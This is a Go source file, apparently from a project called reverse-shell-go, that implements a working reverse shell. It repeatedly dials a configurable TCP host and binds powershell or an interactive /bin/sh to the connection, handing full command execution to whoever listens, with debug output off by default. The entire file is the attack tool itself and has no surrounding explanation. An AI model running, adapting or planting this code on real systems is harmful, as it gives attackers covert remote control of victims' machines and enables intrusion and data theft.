package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

// delay sets the time period between connection attempts
const delay = 5

// host sets the address of the server to connect to
const host = "127.0.0.1:8080"

// debug sets if program should provide output
const debug = false

func main() {
	if debug {
		printDebug("starting in debug mode")
	}
	printDebug("github.com/orf1/reverse-shell-go")
	for {
		time.Sleep(delay * time.Second)
		connect()
	}
}

// connect attempts to send a shell to a remote server
func connect() {
	// attempts to establish a tcp connection with server
	printDebug("attempting to establish tcp connection with server")
	con, err := net.Dial("tcp", host)
	if err != nil {
		printDebug(err.Error())
		return
	}
	printDebug("connection established")

	cmd := getOsCmd()

	// binds stdin, stdout, and stderr to connection
	fmt.Println("binding standard interfaces to connection")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	// opens shell
	printDebug("shell opened")
	err = cmd.Run()
	if err != nil {
		printDebug(err.Error())
		return
	}
	printDebug("shell closed")
}

// detects running os and returns appropriate shell
func getOsCmd() *exec.Cmd {
	printDebug("detecting operating system")
	if runtime.GOOS == "windows" {
		printDebug("detected windows, using powershell")
		return exec.Command("powershell")
	} else {
		printDebug("detected mac or linux, using /b in/sh")
		return exec.Command("/bin/sh", "-i")
	}
}

// replaces fmt.Println with a function that checks if debug mode is on
func printDebug(text string) {
	if debug {
		fmt.Println(text)
	}
}
